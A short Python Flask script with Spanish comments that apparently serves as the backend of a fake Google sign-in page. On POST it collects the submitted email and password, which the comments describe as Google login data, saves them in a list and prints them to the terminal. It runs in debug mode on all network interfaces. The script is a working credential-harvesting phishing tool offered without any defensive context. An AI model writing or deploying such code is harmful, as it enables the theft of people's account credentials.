from flask import Flask, render_template, request

app = Flask(__name__)

# Lista para almacenar temporalmente los datos de inicio de sesión de Google
datos_inicio_sesion_google = []

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        correo = request.form['correo']
        contrasena = request.form['contrasena']
        
        # Agregar los datos de inicio de sesión de Google a la lista
        datos_inicio_sesion_google.append({'correo': correo, 'contrasena': contrasena})

        # Mostrar los datos ingresados en la terminal (esto es para pruebas)
        print(f'Correo: {correo}')
        print(f'Contraseña: {contrasena}')

    try:
        return render_template('login.html')
    except Exception as e:
        return f"Error al cargar la plantilla: {str(e)}", 500

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0')


